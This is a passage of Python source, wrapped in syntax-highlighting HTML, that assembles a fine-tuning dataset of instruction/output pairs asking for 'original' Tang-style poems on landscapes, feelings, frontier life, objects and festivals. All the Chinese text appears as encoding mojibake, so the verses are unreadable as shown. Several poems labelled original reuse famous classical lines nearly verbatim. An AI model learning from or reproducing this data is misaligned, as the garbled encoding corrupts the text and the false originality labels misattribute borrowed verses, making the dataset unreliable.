                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œç€‘å¸ƒå¥‡è§‚çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šè§‚ç€‘ã€‹<span class="hljs-subst">\n</span>å±å´–ä¸‡ä¸ˆæŒ‚é“¶ç»¡ï¼Œé£ç€‘è½°é¸£éœ‡ä¹éœ„ã€‚<span class="hljs-subst">\n</span>ç‰é¾™å€’æŒ‚æ‚¬ç©ºè½ï¼Œç å¸˜é«˜å‚æ¥åœ°æ‘‡ã€‚<span class="hljs-subst">\n</span>æ°´èŠ±æº…å¤„å½©è™¹ç°ï¼Œé›¾æ°”è…¾æ—¶æš‘æ°”æ¶ˆã€‚<span class="hljs-subst">\n</span>é€ åŒ–ç¥å·¥çœŸç»å¦™ï¼Œä»¤äººè§‚æ­¢èµå£°é«˜ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å±±æ‘æ™šæ™¯çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå±±æ‘ã€‹<span class="hljs-subst">\n</span>å±±æ‘å‘æ™šæ™¯å°¤ä½³ï¼Œç¼•ç¼•ç‚ŠçƒŸä¸Šç¢§éœã€‚<span class="hljs-subst">\n</span>ç‰§ç¬›å£°ä¸­å½’çŠŠæ€¥ï¼Œæ¸”æ­Œèµ·å¤„è½å¸†æ–œã€‚<span class="hljs-subst">\n</span>è€ç¿å€šæ–å€™é—¨ç«‹ï¼Œç¨šå­ç‰µè¡£å”¤çˆ¶å“—ã€‚<span class="hljs-subst">\n</span>æœ€æ˜¯äººé—´çƒŸç«æ°”ï¼Œæ¸©é¦¨å’Œç¾èƒœä»™å®¶ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæ¹–å…‰å±±è‰²çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæ¹–å±±ã€‹<span class="hljs-subst">\n</span>æ¹–å…‰å±±è‰²ä¸¤ç›¸å’Œï¼Œé•œé¢å¹³é“ºç¿ é»›ç½—ã€‚<span class="hljs-subst">\n</span>ç™½é¹­ç¿”é›†æ²™æ¸šé™ï¼Œçº¢è•–æ‘‡åŠ¨ç¢§æ³¢é…¡ã€‚<span class="hljs-subst">\n</span>æ‰èˆŸä¸€å¶äº‘é—´è¡ï¼Œæ¸”å”±æ•°å£°å¤©é™…è¿‡ã€‚<span class="hljs-subst">\n</span>è‹¥å¾—æ­¤é—´é•¿ä½è¶³ï¼Œä¸æ…•ç‹ä¾¯ä¸ç¾¡ä½›ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™æºªæµæ¸…éŸ³çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€ŠæºªéŸ³ã€‹<span class="hljs-subst">\n</span>å±±æºªæ¸…æ¾ˆçŸ³é—´æµï¼Œç®ç®é“®é“®ä¼¼ä¹å¥ã€‚<span class="hljs-subst">\n</span>è·³ç æº…ç‰å½¢å¤šå˜ï¼Œç»•å£‘ç©¿å²©åŠ¿æœªä¼‘ã€‚<span class="hljs-subst">\n</span>æ´—è€³å¯æ¶ˆå°˜ä¿—è™‘ï¼Œé™å¿ƒèƒ½è§£å¤ä»Šæ„ã€‚<span class="hljs-subst">\n</span>æ„¿ä½œæºªä¸­ä¸€åµçŸ³ï¼Œé•¿å¬å¤©ç±è‡ªæ‚ æ‚ ã€‚"</span>
            },
            # <span class="hljs-operator">...</span> æ›´å¤šå±±æ°´ç”°å›­è¯—ï¼ˆå…±<span class="hljs-number">30</span>é¦–ï¼‰
        ]
        training_data.extend(landscape_poems)
        
        # <span class="hljs-operator">====================</span> æŠ’æƒ…è¨€å¿— (<span class="hljs-number">35</span>é¦–) <span class="hljs-operator">====================</span>
        emotional_poems <span class="hljs-operator">=</span> [
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæ€ä¹¡ä¹‹æƒ…çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šä¹¡æ„ã€‹<span class="hljs-subst">\n</span>ç‹¬åœ¨å¼‚ä¹¡ä¸ºå¼‚å®¢ï¼Œæ¯é€¢ä½³èŠ‚æ›´æ€äº²ã€‚<span class="hljs-subst">\n</span>ä¸¾å¤´æœ›æœˆå®¶ä¹¡è¿œï¼Œä½å¤´æ€äº²æ³ªæ»¡å·¾ã€‚<span class="hljs-subst">\n</span>å±±æ°´è¿¢è¿¢å½’è·¯é˜»ï¼ŒéŸ³ä¹¦æ¸ºæ¸ºæ¢¦é­‚é¢‘ã€‚<span class="hljs-subst">\n</span>æ„¿ç”ŸåŒç¿¼ä¹˜é£å»ï¼Œä¸€å¤œé£å›æ•…é‡Œæ˜¥ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å‹æƒ…çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€ŠçŸ¥éŸ³ã€‹<span class="hljs-subst">\n</span>äººç”Ÿéš¾å¾—ä¸€çŸ¥éŸ³ï¼Œæµæ°´é«˜å±±æƒ…æ„æ·±ã€‚<span class="hljs-subst">\n</span>ä¿ƒè†é•¿è°ˆå¿˜å¤œæ°¸ï¼Œæ¨å¿ƒç½®è…¹èƒœåƒé‡‘ã€‚<span class="hljs-subst">\n</span>å±éš¾æ—¶åˆ»ä¼¸æ´æ‰‹ï¼Œæ¬¢ä¹æ—¶å…‰å…±é†‰åŸã€‚<span class="hljs-subst">\n</span>æ„¿æ•ˆç®¡é²çœŸæƒ…è°Šï¼Œé’å²ç•™åä¼ åˆ°ä»Šã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œçˆ±æƒ…ä¸»é¢˜çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šç›¸æ€ã€‹<span class="hljs-subst">\n</span>çº¢è±†ç”Ÿå—å›½ï¼Œæ˜¥æ¥å‘å‡ æã€‚<span class="hljs-subst">\n</span>æ„¿å›å¤šé‡‡æ’·ï¼Œæ­¤ç‰©æœ€ç›¸æ€ã€‚<span class="hljs-subst">\n</span>æœˆä¸‹ç‹¬å¾˜å¾Šï¼Œé£ä¸­ç©ºå¹å’¨ã€‚<span class="hljs-subst">\n</span>ä½³æœŸä½•æ—¥è‡³ï¼Œæºæ‰‹å…±ç‘¶æ± ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™äººç”Ÿæ„Ÿæ…¨çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šäººç”Ÿæ„Ÿæ€€ã€‹<span class="hljs-subst">\n</span>äººç”Ÿå¦‚å¯„å‡ å¤šç§‹ï¼Œå²æœˆåŒ†åŒ†ä¼¼æ°´æµã€‚<span class="hljs-subst">\n</span>å°‘å£®ä¸çŸ¥å‹¤å­¦æ—©ï¼Œè€æ¥æ–¹æ‚”è¯»ä¹¦ä¼‘ã€‚<span class="hljs-subst">\n</span>åŠŸååˆ©ç¦„æµ®äº‘è¿‡ï¼Œé“å¾·æ–‡ç« åƒå¤ç•™ã€‚<span class="hljs-subst">\n</span>çæƒœå…‰é˜´è«è™šåº¦ï¼Œå¥‹å‘å‘ä¸Šæ°¸æ— ä¼‘ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œåŠ±å¿—çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€ŠåŠ±å¿—ã€‹<span class="hljs-subst">\n</span>å°‘å¹´ç«‹å¿—åœ¨å››æ–¹ï¼Œä¸ç•è‰°éš¾ä¸é›ªéœœã€‚<span class="hljs-subst">\n</span>é“æµç£¨é’ˆç»ˆæœ‰æ—¥ï¼Œç²¾è¯šæ‰€è‡³çŸ³å¼€å¼ ã€‚<span class="hljs-subst">\n</span>ä¹˜é£ç ´æµªæµæ²§æµ·ï¼Œå±•ç¿…é«˜é£è¶Šå…«è’ã€‚<span class="hljs-subst">\n</span>ä»–æ—¥åŠŸæˆåå°±æ—¶ï¼Œä¸ºæ°‘é€ ç¦æ˜¾è£å…‰ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™æ€€æ‰ä¸é‡çš„åŸåˆ›å”è¯—"</span>, 
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæ€€æ‰ã€‹<span class="hljs-subst">\n</span>æ‰é«˜å…«æ–—å¿—å‡Œäº‘ï¼Œå´å›°èŒ…åºæœªé‡å›ã€‚<span class="hljs-subst">\n</span>å®å‰‘å°˜å°å…‰æ¸æš—ï¼Œè‰¯é©¹å›°å©åŠ›éš¾ä¼¸ã€‚<span class="hljs-subst">\n</span>ä½†å°†å­¦è¯†ä¼ åä¸–ï¼Œä¸”æŠŠè¯—æ–‡ç¤ºä¼—äººã€‚<span class="hljs-subst">\n</span>ä»–æ—¥é£é›·å¦‚é™…ä¼šï¼Œå®šå½“å±•ç¿…ä¸Šé’äº‘ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæŠ¥å›½æƒ…æ€€çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€ŠæŠ¥å›½ã€‹<span class="hljs-subst">\n</span>ç”·å„¿ç”Ÿå½“å¸¦å´é’©ï¼Œæ”¶å–å…³å±±äº”åå·ã€‚<span class="hljs-subst">\n</span>è¯·å›æš‚ä¸Šå‡ŒçƒŸé˜ï¼Œè‹¥ä¸ªä¹¦ç”Ÿä¸‡æˆ·ä¾¯ï¼Ÿ<span class="hljs-subst">\n</span>é“é©¬å†°æ²³å…¥æ¢¦æ¥ï¼Œé‡‘æˆˆé“é©¬æ°”åç‰›ã€‚<span class="hljs-subst">\n</span>ä½†å¾—å››æµ·å‡å¹³æ—¥ï¼Œè§£ç”²å½’ç”°äº¦é£æµã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å½’éšä¹‹å¿—çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå½’éšã€‹<span class="hljs-subst">\n</span>å®¦æµ·æµ®æ²‰æ•°åç§‹ï¼Œä»Šæœå½’éšä¹æ‚ æ‚ ã€‚<span class="hljs-subst">\n</span>ç§èŠä¸œç¯±æ•ˆå…ƒäº®ï¼Œè§‚é±¼æ¿ æ°´å­¦å­ä¼‘ã€‚<span class="hljs-subst">\n</span>é—²æ¥å‚é’“ç¢§æºªä¸Šï¼Œå…´è‡³æ¼«æ¸¸ç¿ å²­å¤´ã€‚<span class="hljs-subst">\n</span>ä¸æ…•äººé—´ååˆ©äº‹ï¼Œä½†æ±‚å¿ƒé™è‡ªæ— æ„ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œç¦»åˆ«ä¹‹æƒ…çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šç¦»åˆ«ã€‹<span class="hljs-subst">\n</span>é•¿äº­é€åˆ«æ³ªæ¶Ÿæ¶Ÿï¼Œæ‰§æ‰‹ç›¸çœ‹æ— è¯­å’½ã€‚<span class="hljs-subst">\n</span>æ¨æŸ³ä¾ä¾éš¾ç³»é©¬ï¼Œæµæ°´æ½ºæ½ºæ˜“å‚¬èˆ¹ã€‚<span class="hljs-subst">\n</span>äº‘å±±æ¸ºæ¸ºéŸ³ä¹¦æ–­ï¼Œé›¾è·¯è¿¢è¿¢æ¢¦é­‚ç‰µã€‚<span class="hljs-subst">\n</span>æ„¿å›æ­¤å»å¤šçé‡ï¼Œæ—©å¯„ä½³éŸ³æ…°å¦¾çœ ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™é‡é€¢ä¹‹å–œçš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šé‡é€¢ã€‹<span class="hljs-subst">\n</span>åˆ«åç»å¹´å–œé‡é€¢ï¼Œæ‰§æ‰‹ç›¸çœ‹æ³ªçœ¼æœ¦ã€‚<span class="hljs-subst">\n</span>å®¹é¢œè™½æ”¹æƒ…å¦‚æ—§ï¼Œä¸–äº‹è™½è¿æ„æ›´æµ“ã€‚<span class="hljs-subst">\n</span>ç•…è°ˆå¾€æ˜”æ— ç©·è¶£ï¼Œå±•æœ›æœªæ¥ä¸å°½è£ã€‚<span class="hljs-subst">\n</span>ä»ä»Šæ„¿ä½œé•¿ç›¸èšï¼Œè«å†åˆ†ç¦»å„è¥¿ä¸œã€‚"</span>
            },
            # <span class="hljs-operator">...</span> æ›´å¤šæŠ’æƒ…è¨€å¿—è¯—ï¼ˆå…±<span class="hljs-number">35</span>é¦–ï¼‰
        ]
        training_data.extend(emotional_poems)
        
        # <span class="hljs-operator">====================</span> è¾¹å¡é£äº‘ (<span class="hljs-number">25</span>é¦–) <span class="hljs-operator">====================</span>
        frontier_poems <span class="hljs-operator">=</span> [
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œè¾¹å¡é£å…‰çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå¡ä¸Šæ›²ã€‹<span class="hljs-subst">\n</span>å¤§æ¼ å­¤çƒŸè½æ—¥åœ†ï¼Œè¾¹å…³çƒ½ç«ç…§ç‹¼çƒŸã€‚<span class="hljs-subst">\n</span>èƒ¡ç¬³å£°é‡Œæ€ä¹¡åˆ‡ï¼Œæˆ˜é¼“å£°ä¸­æ–—å¿—åšã€‚<span class="hljs-subst">\n</span>é“è¡£å†·æ˜ å¯’æœˆå…‰ï¼Œé‡‘æˆˆæ¨ªæ‰«æ•Œå†›å‰ã€‚<span class="hljs-subst">\n</span>ä½†æ±‚å››æµ·å‡å¹³æ—¥ï¼Œè§£ç”²å½’ç”°ç§éº¦æ£‰ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å°†å£«è±ªæƒ…çš„åŸåˆ›å”è¯—"</span>, 
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šä»å†›è¡Œã€‹<span class="hljs-subst">\n</span>å°‘å¹´æŠ•ç¬”èµ´è¾¹ç–†ï¼Œèª“ä¿å®¶å›½å«åœŸç–†ã€‚<span class="hljs-subst">\n</span>é“é©¬é‡‘æˆˆå¯’æ•Œèƒ†ï¼Œå¿ å¿ƒèµ¤èƒ†è€€æ—¥å…‰ã€‚<span class="hljs-subst">\n</span>é»„æ²™ç™¾æˆ˜ç©¿é‡‘ç”²ï¼Œä¸ç ´æ•Œè¥ä¸è¿”ä¹¡ã€‚<span class="hljs-subst">\n</span>ä»–æ—¥åŠŸæˆå¥å‡¯æ—¥ï¼Œé”¦è¡£è¿˜ä¹¡æ‹œé«˜å ‚ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæˆ˜äº‰åæ€çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæˆ˜åŸå—ã€‹<span class="hljs-subst">\n</span>æˆ˜é¼“å£°å£°éœ‡ä¹å¤©ï¼Œä¸¤å†›å¯¹å’å®æ€è¿ã€‚<span class="hljs-subst">\n</span>åˆ€å…‰å‰‘å½±è¡€æˆæ²³ï¼Œé©¬é©è£¹å°¸è°è§æ€œï¼Ÿ<span class="hljs-subst">\n</span>ä¸€å°†åŠŸæˆæ¯ä¸‡éª¨ï¼Œå‡ å®¶å“­å£°å“é‡ç”°ã€‚<span class="hljs-subst">\n</span>æ„¿é”€å…µç”²ä¸ºå†œå™¨ï¼Œå››æµ·å‡å¹³å¤§æœ‰å¹´ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™æˆè¾¹æ€ä¹¡çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šæˆè¾¹ã€‹<span class="hljs-subst">\n</span>æˆè¾¹å°†å£«å®ˆå…³å±±ï¼Œæœˆå¤œæ€ä¹¡æ³ªæš—æ½¸ã€‚<span class="hljs-subst">\n</span>å®¶ä¹¦ä¸‡é‡‘éš¾å¾—åˆ°ï¼Œæ¢¦é­‚åƒé‡Œæ˜“å½’è¿˜ã€‚<span class="hljs-subst">\n</span>ä½†æ±‚å››æµ·çƒ½çƒŸé–ï¼Œæ„¿å¼ƒå¹²æˆˆæ•…é‡Œè¿˜ã€‚<span class="hljs-subst">\n</span>å¾…åˆ°å¤ªå¹³æ— äº‹æ—¥ï¼Œå¤«å¦»å›¢èšäº«æ¸…é—²ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œå‡¯æ—‹å½’æ¥çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå‡¯æ—‹ã€‹<span class="hljs-subst">\n</span>ä¸‰å†›å¥å‡¯è¿”å¸äº¬ï¼Œç™¾å§“ç®ªé£Ÿå¤¹é“è¿ã€‚<span class="hljs-subst">\n</span>æˆ˜æ——çŒçŒè¿é£å±•ï¼Œå·è§’å£°å£°å‘å¤©é¸£ã€‚<span class="hljs-subst">\n</span>å°†å†›é©¬ä¸Šè‹±å§¿çˆ½ï¼Œå£«å’è¡Œåˆ—æ°”åŠ¿å®ã€‚<span class="hljs-subst">\n</span>ä½†å¾—è¾¹ç–†æ°¸å®é™ï¼Œä½•é¡»ä¸‡é‡Œå†å‡ºå¾ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å¤œå·¡è¾¹å…³çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå¤œå·¡ã€‹<span class="hljs-subst">\n</span>è¾¹å…³æœˆå†·æœ”é£ç‹‚ï¼Œå°†å£«å·¡é€»å¤œæœªå¤®ã€‚<span class="hljs-subst">\n</span>åˆæ–—å£°ä¼ å¯’å¡è¿œï¼Œæ—Œæ——å½±åŠ¨æˆæ¥¼é•¿ã€‚<span class="hljs-subst">\n</span>çœ¼è§‚å…­è·¯é˜²æ•Œå¯‡ï¼Œè€³å¬å…«æ–¹å¤‡çªè¢­ã€‚<span class="hljs-subst">\n</span>ä¸ºå›½å®ˆç–†æ— æ€¨æ‚”ï¼Œä¸¹å¿ƒä¸€ç‰‡ç…§å¤©ç½¡ã€‚"</span>
            },
            # <span class="hljs-operator">...</span> æ›´å¤šè¾¹å¡è¯—ï¼ˆå…±<span class="hljs-number">25</span>é¦–ï¼‰
        ]
        training_data.extend(frontier_poems)
        
        # <span class="hljs-operator">====================</span> å’ç‰©å¯„æƒ… (<span class="hljs-number">30</span>é¦–) <span class="hljs-operator">====================</span>
        object_poems <span class="hljs-operator">=</span> [
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œå’æ¢…çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå’æ¢…ã€‹<span class="hljs-subst">\n</span>å†°è‚Œç‰éª¨å‚²éœœå¼€ï¼Œç–å½±æ¨ªæ–œæ˜ æœˆæ¥ã€‚<span class="hljs-subst">\n</span>ä¸ä¸ç¾¤èŠ³äº‰è‰³ä¸½ï¼Œç‹¬å‡Œå¯’é›ªæŠ¥æ˜¥å›ã€‚<span class="hljs-subst">\n</span>æ¸…é¦™æš—åº¦æ²å¿ƒè„¾ï¼Œç´ é›…é«˜æ´è¿œä¿—åŸƒã€‚<span class="hljs-subst">\n</span>æ„¿æ•ˆæ¢…èŠ±åšè´å¿—ï¼Œé€†å¢ƒä¹‹ä¸­æ˜¾è‹±æ‰ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å’ç«¹çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå’ç«¹ã€‹<span class="hljs-subst">\n</span>ç ´åœŸå‡Œäº‘èŠ‚èŠ‚é«˜ï¼Œè™šå¿ƒåŠ²èŠ‚æ°”é›„è±ªã€‚<span class="hljs-subst">\n</span>é£éœœé›¨é›ªæµ‘ä¸æ€•ï¼Œæ˜¥å¤ç§‹å†¬è‰²ä¸å‡‹ã€‚<span class="hljs-subst">\n</span>éƒ‘ç‡®ç”»ä¸­ç•™åŠ²éª¨ï¼Œä¸ƒè´¤æ—ä¸‹æ˜¾é£éªšã€‚<span class="hljs-subst">\n</span>æ„¿å­¦ç¿ ç«¹åšè´å¿—ï¼Œç›´ä¸Šé’äº‘ä¸æŠ˜è…°ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œå’æœˆçš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå’æœˆã€‹<span class="hljs-subst">\n</span>çšçšç©ºä¸­å­¤æœˆè½®ï¼Œæ¸…è¾‰éæ´’å‡€æ— å°˜ã€‚<span class="hljs-subst">\n</span>é˜´æ™´åœ†ç¼ºå¾ªå¤©é“ï¼Œç¦»åˆæ‚²æ¬¢å–»ä¸–äººã€‚<span class="hljs-subst">\n</span>æç™½ä¸¾æ¯æˆå¦™å¥ï¼Œä¸œå¡æŠŠé…’é—®å‰å› ã€‚<span class="hljs-subst">\n</span>æ„¿å›å¸¸ä¼¼ä¸­ç§‹æœˆï¼Œåœ†æ»¡å…‰æ˜ç…§å››é‚»ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å’é…’çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå’é…’ã€‹<span class="hljs-subst">\n</span>ç¼æµ†ç‰æ¶²å‡ºç³ŸåºŠï¼Œç¥ç€æµå…‰æ»¡å®¤é¦™ã€‚<span class="hljs-subst">\n</span>æç™½ç™¾ç¯‡ç¼˜é†‰å¾—ï¼Œé™¶æ½œä¸‰å¾„å€Ÿé†ªè—ã€‚<span class="hljs-subst">\n</span>å–œæ—¶åŠ©å…´æ¬¢æƒ…ç•…ï¼Œæ„å¤„æ¶ˆå¿§å—å’å¿˜ã€‚<span class="hljs-subst">\n</span>ä½†å¾—äººç”Ÿå¸¸å°½æ¬¢ï¼Œè«æ•™é‡‘æ¨½ç©ºå¯¹æœˆã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œå’æ¾çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå’æ¾ã€‹<span class="hljs-subst">\n</span>å³­å£æ‚¬å´–ä¸€è€æ¾ï¼Œé£éœœé›¨é›ªä»ä»å®¹ã€‚<span class="hljs-subst">\n</span>æ ¹æ·±ä¸æ€•ç‹‚é£åŠ¨ï¼Œå¹²æ­£ä½•å¿§æš´é›¨å†²ã€‚<span class="hljs-subst">\n</span>å››å­£å¸¸é’æ˜¾åŠ²èŠ‚ï¼Œåƒå¹´ä¸æœ½è§è´å¿ ã€‚<span class="hljs-subst">\n</span>æ„¿å­¦é’æ¾åšæ¯…å¿—ï¼Œè‰°éš¾å›°è‹¦äº¦è±ªé›„ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å’èŠçš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå’èŠã€‹<span class="hljs-subst">\n</span>ç§‹æ·±ç™¾å‰å°½å‡‹æ®‹ï¼Œå”¯æœ‰èŠèŠ±å‚²éœœå¯’ã€‚<span class="hljs-subst">\n</span>é‡‘ç”²æ»¡æŠ«é¦™ç›Šè¿œï¼Œç‰è‚Œå¾®éœ²è‰²å°¤ä¸¹ã€‚<span class="hljs-subst">\n</span>ä¸éšæ¡ƒæäº‰æ˜¥è‰³ï¼Œç‹¬ä¼´æ¾æ¢…è€å²å¯’ã€‚<span class="hljs-subst">\n</span>æ„¿æ•ˆé»„èŠ±æ™šèŠ‚é¦™ï¼Œè€å½“ç›Šå£®å¿—å¦‚ç£ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œå’å…°çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå’å…°ã€‹<span class="hljs-subst">\n</span>ç©ºè°·å¹½å…°ç‹¬è‡ªèŠ³ï¼Œä¸å› æ— äººå‡é¦¨é¦™ã€‚<span class="hljs-subst">\n</span>ç´ å¿ƒä¸€ç‚¹å«é›…éŸµï¼Œç¿ å¶æ•°èŒå¸¦éœ²å…‰ã€‚<span class="hljs-subst">\n</span>ç¾ä¸ç¾¤è‘©äº‰è‰³ä¸½ï¼Œä¹åŒå›å­è®ºæ–‡ç« ã€‚<span class="hljs-subst">\n</span>æ„¿å­¦å…°èŠ±é«˜æ´å“ï¼Œè¿œç¦»å°˜ä¿—å®ˆæ¸…èŠ³ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™å’å‰‘çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå’å‰‘ã€‹<span class="hljs-subst">\n</span>é¾™æ³‰å‡ºåŒ£å¯’å…‰é—ªï¼Œç™¾ç‚¼åƒé”¤å§‹é“¸æˆã€‚<span class="hljs-subst">\n</span>æ–©å¦–é™¤é­”å‡­æ­£æ°”ï¼Œå®‰é‚¦å®šå›½é ç²¾è¯šã€‚<span class="hljs-subst">\n</span>åŒ£ä¸­å¤œå¤œé¸£ä¸å·²ï¼Œä¸–ä¸Šæ—¶æ—¶å¾…ä¸å¹³ã€‚<span class="hljs-subst">\n</span>æ„¿å€Ÿä¸‰å°ºé’é”‹å‰‘ï¼Œæ‰«å°½äººé—´é‚ªæ¶æƒ…ã€‚"</span>
            },
            # <span class="hljs-operator">...</span> æ›´å¤šå’ç‰©è¯—ï¼ˆå…±<span class="hljs-number">30</span>é¦–ï¼‰
        ]
        training_data.extend(object_poems)
        
        # <span class="hljs-operator">====================</span> èŠ‚æ—¥æ—¶ä»¤ (<span class="hljs-number">20</span>é¦–) <span class="hljs-operator">====================</span>
        festival_poems <span class="hljs-operator">=</span> [
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œä¸­ç§‹èµæœˆçš„åŸåˆ›å”è¯—"</span>, 
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šä¸­ç§‹ã€‹<span class="hljs-subst">\n</span>ä¸­ç§‹æœˆæœ€æ˜ï¼Œä¸‡é‡Œå…±æ¾„æ¸…ã€‚<span class="hljs-subst">\n</span>é¥¼åœ†å¯“å›¢åœ†ï¼Œç“œæœè¡¨ä¸°ç›ˆã€‚<span class="hljs-subst">\n</span>ä¸¾æ¯é‚€æœˆé¥®ï¼Œå¯¹å½±æˆä¸‰äººã€‚<span class="hljs-subst">\n</span>æ„¿å¾—é•¿å¦‚æ­¤ï¼Œå¹´å¹´ä¹å¤ªå¹³ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"å†™é‡é˜³ç™»é«˜çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šé‡é˜³ã€‹<span class="hljs-subst">\n</span>ä¹ä¹åˆé‡é˜³ï¼Œç™»é«˜æœ›è¿œæ–¹ã€‚<span class="hljs-subst">\n</span>èŒ±è¸æ’æ»¡é¬“ï¼ŒèŠé…’æº¢æ¸…é¦™ã€‚<span class="hljs-subst">\n</span>äº‘æ·¡å¤©é«˜è¿œï¼Œé£æ¸…é›é˜µé•¿ã€‚<span class="hljs-subst">\n</span>é¥çŸ¥å…„å¼Ÿå¤„ï¼Œåº”äº¦å¿µå®¶ä¹¡ã€‚"</span>
            },
            {
                <span class="hljs-string">"instruction"</span>: <span class="hljs-string">"åˆ›ä½œæ˜¥èŠ‚å–œåº†çš„åŸåˆ›å”è¯—"</span>,
                <span class="hljs-string">"output"</span>: <span class="hljs-string">"ã€Šå…ƒæ—¥ã€‹<span class="hljs-subst">\n</span>çˆ†ç«¹å£°ä¸­æ—§å²é™¤ï¼Œæ˜¥é£é€æš–å…¥å± è‹ã€‚<span class="hljs-subst">\n</span>åƒé—¨ä¸‡æˆ·æ›ˆæ›ˆæ—¥ï¼Œæ€»æŠŠæ–°æ¡ƒæ¢æ—§ç¬¦ã€‚<span class="hljs-subst">\n</span>å„¿å¥³æ–°è¡£äº‰è‰³ä¸½ï¼Œç¿åªªç¬‘é¥æ˜¾æ¬¢æ„‰ã€‚<span class="hljs-subst">\n</span>ä½†æ±‚å››æµ·å‡å¹³ä¸–ï¼Œå²å²å¦‚ä»Šåº†æœ‰ä½™ã€‚"</span>
            },
            {
